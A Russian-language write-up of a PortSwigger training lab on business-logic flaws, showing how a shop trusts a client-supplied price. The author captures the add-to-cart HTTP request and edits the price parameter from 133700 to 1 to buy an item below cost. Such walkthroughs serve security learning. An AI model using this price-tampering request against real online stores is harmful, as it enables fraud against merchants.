---
title: "Excessive trust in client-side controls"
date: 2025-10-16
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls"
classes: wide
---

Для решения необходимо купить `Lightweight l33t leather jacket`. Для входа в учетную запись есть креды `wiener`:`peter`.

```
https://0a9800e003497ec381dbfcaa00f800b9.web-security-academy.net
```

# Solution

Как всегда нужно осмотреться. Залогинюсь в личный кабинет. На балансе даже есть 100$. Попробую что-то купить. У нашей мечты `productid=1`. Думаю, что это может пригодиться.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_excessive-trust-in-client-side-controls/1.png){: height="200" .align-center}

Нужно войти в аккаунт. Креды я дам. Нужно купить жилет. Денег я не дам.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_excessive-trust-in-client-side-controls/2.jpeg){: height="200" .align-center}

Печаль(

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_excessive-trust-in-client-side-controls/3.png){: height="200" .align-center}

Попробую купить что-то подешевле. Вот такую штуку купить получилось. 

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_excessive-trust-in-client-side-controls/4.png){: height="200" .align-center}

Но запрос на покупку мне ничего не сказал. 

```http
POST /cart/checkout HTTP/2
Host: 0a9800e003497ec381dbfcaa00f800b9.web-security-academy.net
Cookie: session=TU5zBxHL8jP3KWpsAqeJDml7qleXEsEL
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9800e003497ec381dbfcaa00f800b9.web-security-academy.net/cart
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://0a9800e003497ec381dbfcaa00f800b9.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
Te: trailers

csrf=eBZT5QduV47JhZVmKdgk33wFaupkZBdi
```

В истории запросов я нашел вот это:

```http
POST /cart HTTP/2
Host: 0a9800e003497ec381dbfcaa00f800b9.web-security-academy.net
Cookie: session=TU5zBxHL8jP3KWpsAqeJDml7qleXEsEL
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9800e003497ec381dbfcaa00f800b9.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: https://0a9800e003497ec381dbfcaa00f800b9.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

productId=1&redir=PRODUCT&quantity=1&price=133700
```

Не знаю зачем, но в запросе добавления в корзину передается цена. А мне и не сложно потестить:

```http
POST /cart HTTP/2
Host: 0a9800e003497ec381dbfcaa00f800b9.web-security-academy.net
Cookie: session=TU5zBxHL8jP3KWpsAqeJDml7qleXEsEL
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9800e003497ec381dbfcaa00f800b9.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: https://0a9800e003497ec381dbfcaa00f800b9.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

productId=1&redir=PRODUCT&quantity=1&price=1
```

Меня устраивает такая цена)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_excessive-trust-in-client-side-controls/5.png){: height="200" .align-center}

Решена)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_excessive-trust-in-client-side-controls/6.png){: height="200" .align-center}
